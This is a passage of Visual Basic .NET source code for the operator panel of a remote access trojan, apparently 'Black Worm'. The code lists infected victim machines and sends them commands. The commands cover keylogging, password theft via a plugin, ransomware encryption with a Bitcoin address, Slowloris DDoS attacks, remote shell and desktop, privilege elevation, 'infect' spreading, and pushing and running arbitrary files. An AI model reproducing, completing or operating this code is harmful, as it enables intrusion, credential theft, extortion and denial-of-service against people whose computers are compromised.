itm.Text.EndsWith(".MPCPL") Or itm.Text.EndsWith(".m3u") Or itm.Text.EndsWith(".M3U") Or itm.Text.EndsWith(".pls") Or itm.Text.EndsWith(".PLS") Then
                                itm.ImageIndex = 10
                            ElseIf itm.Text.EndsWith(".lnk") Or itm.Text.EndsWith(".LNK") Then
                                itm.ImageIndex = 12
                            ElseIf itm.Text.EndsWith(".bin") Or itm.Text.EndsWith(".BIN") Or itm.Text.EndsWith(".bak") Or itm.Text.EndsWith(".BAK") Or itm.Text.EndsWith(".dat") Or itm.Text.EndsWith(".DAT") Then
                                itm.ImageIndex = 13
                            ElseIf itm.Text.EndsWith(".xlsx") Or itm.Text.EndsWith(".XLSX") Or itm.Text.EndsWith(".xlsm") Or itm.Text.EndsWith(".XLSM") Or itm.Text.EndsWith(".xlsb") Or itm.Text.EndsWith(".XLSB") Or itm.Text.EndsWith(".xltm") Or itm.Text.EndsWith(".XLTM") Or itm.Text.EndsWith(".xlam") Or itm.Text.EndsWith(".XLAM") Or itm.Text.EndsWith(".xltx") Or itm.Text.EndsWith(".XLTX") Or itm.Text.EndsWith(".xll") Or itm.Text.EndsWith(".XLL") Then
                                itm.ImageIndex = 14
                            ElseIf itm.Text.EndsWith(".doc") Or itm.Text.EndsWith(".DOC") Or itm.Text.EndsWith(".rtf") Or itm.Text.EndsWith(".RTF") Or itm.Text.EndsWith(".docx") Or itm.Text.EndsWith(".DOCX") Or itm.Text.EndsWith(".docm") Or itm.Text.EndsWith(".DOCM") Or itm.Text.EndsWith(".psw") Or itm.Text.EndsWith(".PSW") Or itm.Text.EndsWith(".dot") Or itm.Text.EndsWith(".DOT") Or itm.Text.EndsWith(".dotx") Or itm.Text.EndsWith(".DOTX") Or itm.Text.EndsWith(".dotm") Or itm.Text.EndsWith(".DOTM") Then
                                itm.ImageIndex = 15
                            ElseIf itm.Text.EndsWith(".ini") Or itm.Text.EndsWith(".INI") Or itm.Text.EndsWith(".sys") Or itm.Text.EndsWith(".SYS") Or itm.Text.EndsWith(".css") Or itm.Text.EndsWith(".CSS") Or itm.Text.EndsWith(".inf") Or itm.Text.EndsWith(".INF") Then
                                itm.ImageIndex = 16
                            ElseIf itm.Text.EndsWith(".pdf") Or itm.Text.EndsWith(".PDF") Then
                                itm.ImageIndex = 17
                            ElseIf itm.Text.EndsWith(".pptx") Or itm.Text.EndsWith(".PPTX") Or itm.Text.EndsWith(".ppt") Or itm.Text.EndsWith(".PPT") Or itm.Text.EndsWith(".pps") Or itm.Text.EndsWith(".PPS") Or itm.Text.EndsWith(".pptm") Or itm.Text.EndsWith(".PPTM") Or itm.Text.EndsWith(".potx") Or itm.Text.EndsWith(".POTX") Or itm.Text.EndsWith(".potm") Or itm.Text.EndsWith(".POTM") Or itm.Text.EndsWith(".ppam") Or itm.Text.EndsWith(".PPAM") Or itm.Text.EndsWith(".ppsx") Or itm.Text.EndsWith(".PPSX") Or itm.Text.EndsWith(".ppsm") Or itm.Text.EndsWith(".PPSM") Then
                                itm.ImageIndex = 18
                            ElseIf itm.Text.EndsWith(".swf") Or itm.Text.EndsWith(".SWF") Or itm.Text.EndsWith(".htm") Or itm.Text.EndsWith(".HTM") Or itm.Text.EndsWith(".html") Or itm.Text.EndsWith(".HTML") Then
                                itm.ImageIndex = 20
                            ElseIf itm.Text.EndsWith(".reg") Or itm.Text.EndsWith(".REG") Then
                                itm.ImageIndex = 19
                            ElseIf itm.Text.EndsWith(".AACCDB") Or itm.Text.EndsWith(".aaccdb") Or itm.Text.EndsWith(".ACCDE") Or itm.Text.EndsWith(".accde") Or itm.Text.EndsWith(".ACCDT") Or itm.Text.EndsWith(".accdt") Or itm.Text.EndsWith(".ACCDR") Or itm.Text.EndsWith(".accdr") Then
                                itm.ImageIndex = 21
                            ElseIf itm.Text.EndsWith(".xml") Or itm.Text.EndsWith(".XML") Then
                                itm.ImageIndex = 22
                            ElseIf itm.Text.EndsWith(".odt") Or itm.Text.EndsWith(".ODT") Or itm.Text.EndsWith(".ott") Or itm.Text.EndsWith(".OTT") Or itm.Text.EndsWith(".sxw") Or itm.Text.EndsWith(".SXW") Or itm.Text.EndsWith(".stw") Or itm.Text.EndsWith(".STW") Or itm.Text.EndsWith(".sor") Or itm.Text.EndsWith(".SOR") Or itm.Text.EndsWith(".sxc") Or itm.Text.EndsWith(".SXC") Or itm.Text.EndsWith(".stc") Or itm.Text.EndsWith(".STC") Or itm.Text.EndsWith(".sxi") Or itm.Text.EndsWith(".SXI") Or itm.Text.EndsWith(".sti") Or itm.Text.EndsWith(".STI") Or itm.Text.EndsWith(".sxd") Or itm.Text.EndsWith(".SXD") Or itm.Text.EndsWith(".std") Or itm.Text.EndsWith(".STD") Or itm.Text.EndsWith(".sxg") Or itm.Text.EndsWith(".SXG") Then
                                itm.ImageIndex = 23
                            ElseIf itm.Text.EndsWith(".temp") Or itm.Text.EndsWith(".TEMP") Or itm.Text.EndsWith(".tmp") Or itm.Text.EndsWith(".TMP") Then
                                itm.ImageIndex = 24
                            ElseIf itm.Text.EndsWith(".iso") Or itm.Text.EndsWith(".ISO") Then
                                itm.ImageIndex = 25
                            ElseIf itm.Text.EndsWith(".save") Or itm.Text.EndsWith(".SAVE") Or itm.Text.EndsWith(".sav") Or itm.Text.EndsWith(".SAV") Then
                                itm.ImageIndex = 26
                            ElseIf itm.Text.EndsWith(".crt") Or itm.Text.EndsWith(".CRT") Then
                                itm.ImageIndex = 27
                            ElseIf itm.Text.EndsWith(".js") Or itm.Text.EndsWith(".JS") Then
                                itm.ImageIndex = 28
                            ElseIf itm.Text.EndsWith(".cat") Or itm.Text.EndsWith(".CAT") Then
                                itm.ImageIndex = 29
                            ElseIf itm.Text.EndsWith(".chm") Or itm.Text.EndsWith(".CHM") Then
                                itm.ImageIndex = 30
                            ElseIf itm.Text.EndsWith(".vmdk") Or itm.Text.EndsWith(".VMDK") Then
                                itm.ImageIndex = 31
                            ElseIf itm.Text.EndsWith(".vmx") Or itm.Text.EndsWith(".VMX") Then
                                itm.ImageIndex = 32
                            ElseIf itm.Text.EndsWith(".vbs") Or itm.Text.EndsWith(".VBS") Or itm.Text.EndsWith(".vbe") Or itm.Text.EndsWith(".VBE") Or itm.Text.EndsWith(".wsf") Or itm.Text.EndsWith(".WSF") Or itm.Text.EndsWith(".wsc") Or itm.Text.EndsWith(".WSC") Then
                                itm.ImageIndex = 33
                            ElseIf itm.Text.EndsWith(".nfo") Or itm.Text.EndsWith(".NFO") Then
                                itm.ImageIndex = 34
                            ElseIf itm.Text.EndsWith(".sln") Or itm.Text.EndsWith(".SLN") Then
                                itm.ImageIndex = 35
                            ElseIf itm.Text.EndsWith(".vb") Or itm.Text.EndsWith(".VB") Then
                                itm.ImageIndex = 36
                            ElseIf itm.Text.EndsWith(".resx") Or itm.Text.EndsWith(".RESX") Then
                                itm.ImageIndex = 37
                            ElseIf itm.Text.EndsWith(".config") Or itm.Text.EndsWith(".CONFIG") Then
                                itm.ImageIndex = 38
                            ElseIf itm.Text.EndsWith(".vbproj") Or itm.Text.EndsWith(".VBPROJ") Then
                                itm.ImageIndex = 39
                            ElseIf itm.Text.EndsWith(".settings") Or itm.Text.EndsWith(".SETTINGS") Then
                                itm.ImageIndex = 40
                            ElseIf itm.Text.EndsWith(".user") Or itm.Text.EndsWith(".USER") Or itm.Text.EndsWith(".suo") Or itm.Text.EndsWith(".SUO") Then
                                itm.ImageIndex = 41
                            ElseIf itm.Text.EndsWith(".pdb") Or itm.Text.EndsWith(".PDB") Then
                                itm.ImageIndex = 42
                            ElseIf itm.Text.EndsWith(".xslt") Or itm.Text.EndsWith(".XSLT") Then
                                itm.ImageIndex = 43
                            ElseIf itm.Text.EndsWith(".obj") Or itm.Text.EndsWith(".OBJ") Then
                                itm.ImageIndex = 44
                            ElseIf itm.Text.EndsWith(".rc") Or itm.Text.EndsWith(".RC") Then
                                itm.ImageIndex = 45
                            ElseIf itm.Text.EndsWith(".inc") Or itm.Text.EndsWith(".INC") Or itm.Text.EndsWith(".lst") Or itm.Text.EndsWith(".LST") Then
                                itm.ImageIndex = 46
                            ElseIf itm.Text.EndsWith(".res") Or itm.Text.EndsWith(".RES") Then
                                itm.ImageIndex = 47
                            ElseIf itm.Text.EndsWith(".mdmp") Or itm.Text.EndsWith(".MDMP") Then
                                itm.ImageIndex = 48
                            ElseIf itm.Text.EndsWith(".ResmonCfg") Or itm.Text.EndsWith(".RESMONCFG") Then
                                itm.ImageIndex = 49
                            ElseIf itm.Text.EndsWith(".conf") Or itm.Text.EndsWith(".CONF") Or itm.Text.EndsWith(".leases") Or itm.Text.EndsWith(".LEASES") Then
                                itm.ImageIndex = 50
                            ElseIf itm.Text.EndsWith(".cur") Or itm.Text.EndsWith(".CUR") Then
                                itm.ImageIndex = 51
                            ElseIf itm.Text.EndsWith(".ani") Or itm.Text.EndsWith(".ANI") Then
                                itm.ImageIndex = 52
                            ElseIf itm.Text.EndsWith(".url") Or itm.Text.EndsWith(".URL") Then
                                itm.ImageIndex = 53
                            ElseIf itm.Text.EndsWith(".ttf") Or itm.Text.EndsWith(".TTF") Or itm.Text.EndsWith(".otf") Or itm.Text.EndsWith(".OTF") Then
                                itm.ImageIndex = 54
                            ElseIf itm.Text.EndsWith(".blend") Or itm.Text.EndsWith(".BLEND") Then
                                itm.ImageIndex = 55
                            ElseIf itm.Text.EndsWith(".icc") Or itm.Text.EndsWith(".ICC") Then
                                itm.ImageIndex = 56
                            ElseIf itm.Text.EndsWith(".a3x") Or itm.Text.EndsWith(".A3X") Or itm.Text.EndsWith(".au3") Or itm.Text.EndsWith(".AU3") Then
                                itm.ImageIndex = 57
                            Else
                                itm.ImageIndex = 8
                            End If
                            fff.ListView1.Items.Add(itm)
                            i += 1
                        Next
                    End If

                Case "viewimage"
                    Dim fff As Form10 = GFORM("Form10" & u.IP)
                    If A(1) = "Error" Then
                        fff.Back1ToolStripMenuItem.PerformClick()
                    Else
                        Dim picbyte() As Byte = Convert.FromBase64String(A(1))
                        Dim ms As New MemoryStream(picbyte)
                        fff.pic1.Image = Image.FromStream(ms)
                    End If


                Case "getpath"
                    Dim fff As Form10 = GFORM("Form10" & u.IP)
                    fff.TextBox1.Text = A(1)
                    S.Send(u, ENB("FileManager") & Y & ENB(A(1)))

                Case "largefile"
                    If GFORM("dw" & u.IP) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf IND)
                        Me.Invoke(j, New Object() {u, b})
                        Exit Sub
                    End If
                    Dim fm As dw = GFORM("dw" & u.IP)
                    If fm Is Nothing Then
                        fm = New dw
                        fm.Name = "dw" & u.IP
                        fm.Text = "Downloader - " & u.IP.Split(":")(0)
                        fm.victimdw = folder
                        fm.Show()
                    End If

                Case "MSG"
                    Try
                        Dim item As New ListViewItem
                        item.Text = TimeOfDay
                        item.SubItems.Add(u.IP.Split(":")(0))
                        Select Case A(3)
                            Case "base"
                                item.SubItems.Add(DEB(A(1)))
                            Case "decode"
                                item.SubItems.Add(A(1))
                        End Select
                        Select Case A(2)
                            Case "Succ"
                                item.SubItems.Add("Successful")
                                item.ForeColor = Color.Green
                            Case "Fail"
                                item.SubItems.Add("Failed")
                                item.ForeColor = Color.Red
                        End Select
                        Logs.Items.Add(item)
                    Catch ex As Exception

                    End Try

                Case "ipinfo"
                    Try
                        Process.Start("https://www.ip-tracker.org/locator/ip-lookup.php?ip=" & u.IP.Split(":")(0))
                    Catch ex As Exception

                    End Try
                Case "opengroup"
                    If GFORM("agroup" & u.IP) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf IND)
                        Me.Invoke(j, New Object() {u, b})
                        Exit Sub
                    End If
                    Dim fm As aGroup = GFORM("agroup" & u.IP)
                    If fm Is Nothing Then
                        fm = New aGroup
                        fm.Name = "agroup" & u.IP
                        fm.Text = "Add to Group - " & u.IP.Split(":")(0)
                        fm.F = Me
                        fm.U = u
                        fm.Show()
                    End If
                Case "removeg"
                    L1.Groups(Convert.ToInt32(A(1))).Items.Remove(u.L)

                Case "aGroup"
                    L1.Groups(Convert.ToInt32(A(1))).Items.Add(u.L)
            End Select

        Catch ex As Exception
        End Try
    End Sub

    Public Function GetSize(ByVal Size As String) As String
        Dim DoubleBytes As Double        '---
        Dim TheSize As ULong = Size
        Dim SizeType As String = ""
        Try
            Select Case TheSize
                Case Is >= 1099511627776
                    DoubleBytes = CDbl(TheSize / 1099511627776) 'TB
                    Return FormatNumber(DoubleBytes, 2) & " TB"
                Case 1073741824 To 1099511627775
                    DoubleBytes = CDbl(TheSize / 1073741824) 'GB
                    Return FormatNumber(DoubleBytes, 2) & " GB"
                Case 1048576 To 1073741823
                    DoubleBytes = CDbl(TheSize / 1048576) 'MB
                    Return FormatNumber(DoubleBytes, 2) & " MB"
                Case 1024 To 1048575
                    DoubleBytes = CDbl(TheSize / 1024) 'KB
                    Return FormatNumber(DoubleBytes, 2) & " KB"
                Case 0 To 1023
                    DoubleBytes = TheSize ' bytes
                    Return FormatNumber(DoubleBytes, 2) & " bytes"
                Case Else
                    Return ""
            End Select
        Catch
            Return ""
        End Try
    End Function
    Private Sub S_Disconnected(ByVal u As USER) Handles S.Disconnected
        SyncLock L1.Items
            Try
                L1.Items(u.IP).Remove()
            Catch ex As Exception
            End Try
        End SyncLock
    End Sub

    Private Sub ToolStripStatusLabel1_Click(sender As System.Object, e As System.EventArgs) Handles ToolStripStatusLabel1.Click
        Form2.Show()
    End Sub
    Private Sub ToolStripStatusLabel2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripStatusLabel2.Click
        Form5.Show()
    End Sub
    Private Sub FromDiskToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem1.Click
        Try
            Dim o As New OpenFileDialog
            With o
                .Filter = "All Type (*.*)|*.*"
                .Title = "Select Your File To Upload"
            End With
            o.ShowDialog()
            Dim n As New IO.FileInfo(o.FileName)
            If o.FileName.Length > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, ENB("sendfile") & Y & ENB(n.Name) & Y & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                Next
                MsgBox("File Has Been Uploaded", MsgBoxStyle.Information, "DONE !")
            End If
        Catch X As Exception
        End Try
    End Sub
    Private Sub FromURLToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromURLToolStripMenuItem1.Click
        Try
            Dim a As String = InputBox("Enter the Direct Link", "File Url")
            Dim aa As String = InputBox("Enter the name of the file", "File Name")
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("download") & Y & ENB(a) & Y & ENB(aa))
            Next
            MsgBox("File Has Been Uploaded", MsgBoxStyle.Information, "DONE !")
        Catch X As Exception
        End Try
    End Sub
    Private Sub OpenWebSiteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OpenWebSiteToolStripMenuItem.Click
        Try
            Dim PageUrl As String = InputBox("WebSite Link", "URL", "[ - - - - - - - - - ]")
            If PageUrl = "" Then
                Exit Sub
            Else
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, ENB("OpenPage") & Y & ENB(PageUrl))
                Next
                MsgBox(PageUrl & " Has Been Opened", MsgBoxStyle.Information, "DONE !")
            End If
        Catch X As Exception
        End Try
    End Sub

    Private Sub RestartToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem1.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("RestartServer"))
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub UninstallToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem1.Click
        Try
            If MsgBox("This Client will be removed permanently." & vbNewLine & "There is no way back after removing a client.", MsgBoxStyle.Critical + MsgBoxStyle.YesNo, "Warning !") = MsgBoxResult.Yes Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, ENB("uninstall"))
                Next
            Else
                Return
            End If
        Catch X As Exception
        End Try
    End Sub

    Private Sub CloseToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("CloseServer"))
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.Text = vr.Replace("xxx", L1.Items.Count).Replace("port", k).Replace("sss", L1.SelectedItems.Count)
        If Me.L1.Items.Count = vbEmpty Then
            L1.ContextMenuStrip = Nothing
        Else
            L1.ContextMenuStrip = ContextMenuStrip1
        End If
    End Sub
    Private Sub BlockWebSiteToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BlockWebSiteToolStripMenuItem.Click
        Try

            For Each x As ListViewItem In L1.SelectedItems
                If x.SubItems(hadmin.Index).Text = "User" Then
                    MsgBox("This Feature Require A Privileged Client", MsgBoxStyle.Critical, "Error")
                Else
                    Dim PageUrlToBlock As String = InputBox("WebSite Link", "URL", "[ - - - - - - - - - ]")
                    If PageUrlToBlock = "" Then
                        Exit Sub
                    Else
                        S.Send(x.Tag, ENB("BlocKPage") & Y & ENB(PageUrlToBlock))
                        MsgBox(PageUrlToBlock & " Has Been Blocked", MsgBoxStyle.Information, "DONE !")
                    End If
                End If
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles LogoffToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("Logoff"))
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("Restart"))
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShutdownToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("Shutdown"))
            Next
        Catch X As Exception
        End Try
    End Sub

    Private Sub UpdateToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UpdateToolStripMenuItem.Click
        Try
            Dim a As New OpenFileDialog
            With a
                .Filter = "(*.exe)|*.exe"
                .Title = "Select Your Server To Update"
            End With
            a.ShowDialog()
            Dim n As New IO.FileInfo(a.FileName)
            If a.FileName.Length > 0 Then
                For Each x As ListViewItem In L1.SelectedItems
                    S.Send(x.Tag, ENB("Update") & Y & ENB(n.Name) & Y & Convert.ToBase64String(IO.File.ReadAllBytes(a.FileName)))
                Next
                MsgBox("Target Client Has Been Updated", MsgBoxStyle.Information, "DONE !")
            End If
        Catch X As Exception
        End Try
    End Sub
    Private Sub StartToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        Control.CheckForIllegalCrossThreadCalls = False
        Try
            S = New Listner(k)
            Try
                Dim item As New ListViewItem
                item.Text = TimeOfDay
                item.SubItems.Add("0.0.0.0")
                item.SubItems.Add("Server Connected to : " & k)
                item.SubItems.Add("Successful")
                item.ForeColor = Color.Black
                Logs.Items.Add(item)
            Catch ex As Exception

            End Try
            StartToolStripMenuItem.Enabled = False
            vr = vr.Replace("0000", k)
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error ):")
            End
        End Try
    End Sub
    Private Sub KeylogstartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("keystart"))
        Next
        MsgBox("Keylogger Started", MsgBoxStyle.Information, "DONE !")
    End Sub
    Private Sub DumpToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("startkey"))
        Next
    End Sub
    Private Sub PluginManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PluginManagerToolStripMenuItem.Click
        Form7.Show()
    End Sub

    Private Sub ExecuteScriptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteScriptToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("openscript"))
        Next
    End Sub
    Private Sub GetPasswordToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetPasswordToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("getpass") & Y & Convert.ToBase64String(IO.File.ReadAllBytes("plugins/pwd.dll")))
        Next
    End Sub
    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click

        If MsgBox("- Warning" & vbNewLine & "- You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent." & vbNewLine & "- Be Careful this function is not tested and it's not stable.", MsgBoxStyle.YesNo + vbCritical, "Warning by the developer") = Windows.Forms.DialogResult.Yes Then
            Dim Bitcoin As String = InputBox("Please Enter Your Bitcoin Address", "Ransomware")
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("startransom") & Y & ENB(Bitcoin))
            Next
            MsgBox("Target Files Has Been Encrypted", MsgBoxStyle.Information, "DONE !")
        Else
            Return
        End If
    End Sub
    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            Dim Key As String = InputBox("Please Enter The Decryption Key for " & x.SubItems(hname.Index).Text, "Ransomware")
            S.Send(x.Tag, ENB("stopransom") & Y & ENB(Key) & Y & Convert.ToBase64String(IO.File.ReadAllBytes("addons\Decryptor.exe")))
        Next
    End Sub
    Private Sub ElevetePrivlageToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ElevetePrivlageToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("elevate"))
        Next
    End Sub
    Private Sub CoustomPluginToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CoustomPluginToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("opencustom"))
        Next
    End Sub
    Private Sub StartToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem1.Click
        Dim strD As String = Interaction.InputBox("WebSite URL :", "Slowloris DDOS Attack", "www.google.com")
        If strD = "" Then
            Exit Sub
        Else
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("startSlowloris") & Y & ENB(strD))
            Next
            MsgBox("Attack Started", MsgBoxStyle.Information, "DONE !")
        End If
    End Sub
    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("stopSlowloris"))
        Next
        MsgBox("Attack Stoped", MsgBoxStyle.Information, "DONE !")
    End Sub
    Private Sub ToolStripStatusLabel3_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel3.Click
        PortSettings.PORT.Value = My.Settings.Port
        PortSettings.TextBox3.Text = My.Settings.Password
        PortSettings.showsettings = False
        PortSettings.Timer1.Stop()
        PortSettings.Opacity = 100
        PortSettings.Show()
    End Sub
    Private Sub LargeIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LargeIconsToolStripMenuItem.Click
        L1.View = View.LargeIcon
    End Sub

    Private Sub SmallIconsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SmallIconsToolStripMenuItem.Click
        L1.View = View.SmallIcon
    End Sub

    Private Sub DToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DToolStripMenuItem.Click
        L1.View = View.Details
    End Sub

    Private Sub ListToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ListToolStripMenuItem.Click
        L1.View = View.List
    End Sub

    Private Sub TitleToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TitleToolStripMenuItem.Click
        L1.View = View.Tile
    End Sub
    Private Sub BackColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackColorToolStripMenuItem.Click
        Dim backcolor As New ColorDialog
        If backcolor.ShowDialog = Windows.Forms.DialogResult.OK Then
            L1.BackColor = backcolor.Color
            Lv1.BackColor = backcolor.Color
            Logs.BackColor = backcolor.Color
        End If
    End Sub
    Private Sub FontColorToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FontColorToolStripMenuItem.Click
        Dim fontcolor As New ColorDialog
        If fontcolor.ShowDialog = Windows.Forms.DialogResult.OK Then
            L1.ForeColor = fontcolor.Color
            Lv1.ForeColor = fontcolor.Color
            Logs.ForeColor = fontcolor.Color
        End If
    End Sub
    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        L1.GridLines = True
        Lv1.GridLines = True
        Logs.GridLines = True
    End Sub
    Private Sub HideToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HideToolStripMenuItem.Click
        L1.GridLines = False
        Lv1.GridLines = False
        Logs.GridLines = False
    End Sub
    Private Sub NoIPToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NoIPToolStripMenuItem.Click
        Form6.Show()
    End Sub
    Private Sub DNSDynmicToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DNSDynmicToolStripMenuItem.Click
        DynuCom.Show()
    End Sub
    Private Sub ToolStripStatusLabel9_Click(sender As Object, e As EventArgs)
        ConPro.Show()
    End Sub
    Private Sub InfectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InfectToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("runzip") & Y & Convert.ToBase64String(IO.File.ReadAllBytes("plugins/zip.dll")))
        Next
    End Sub
    Private Sub ClearLogsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClearLogsToolStripMenuItem.Click
        Logs.Items.Clear()
        Dim item As New ListViewItem
        item.Text = TimeOfDay
        item.SubItems.Add("0.0.0.0")
        item.SubItems.Add("Welcome " & Environment.UserName & " To Black Worm v" & My.Application.Info.Version.Major & "." & My.Application.Info.Version.Minor)
        item.SubItems.Add("Welcome")
        Logs.Items.Add(item)
    End Sub
    Private Sub FileManagerToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FileManagerToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("|||"))
        Next
    End Sub
    Private Sub RemoteDesktopToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("!"))
        Next
    End Sub
    Private Sub ProcessManagerToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ProcessManagerToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("pr"))
        Next
    End Sub
    Private Sub CommandShellToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CommandShellToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("rss"))
        Next
    End Sub
    Private Sub KeyloggerToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("openkl"))
        Next
    End Sub
    Private Sub IPLocationToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles IPLocationToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("openlocation"))
        Next
    End Sub
    Private Sub ToolStripStatusLabel9_Click_2(sender As Object, e As EventArgs) Handles ToolStripStatusLabel9.Click
        GroupManager.Show()
    End Sub
    Private Sub RemoveFromGroupToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoveFromGroupToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("rGroup"))
        Next
    End Sub
    Private Sub MultiToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MultiToolStripMenuItem.Click
        Dim multi As New multi
        multi.Text = "Add to group - Multi Users"
        multi.Show()
    End Sub
    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.Tag, ENB("opengroup"))
        Next
    End Sub
    Private Sub L1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles L1.SelectedIndexChanged
        Try
            For Each x As ListViewItem In L1.SelectedItems
                S.Send(x.Tag, ENB("getinfo"))
            Next
        Catch ex As Exception

        End Try
    End Sub
    Private Sub CopyDataToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyDataToolStripMenuItem.Click
        My.Computer.Clipboard.SetText(Lv1.FocusedItem.Text)
    End Sub

    Private Sub ServiceManagerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ServiceManagerToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            If x.SubItems(hadmin.Index).Text = "User" Then
                MsgBox("This Feature Require A Privileged Client", MsgBoxStyle.Critical, "Error")
            Else
                S.Send(x.Tag, ENB("sr"))
            End If
        Next
    End Sub

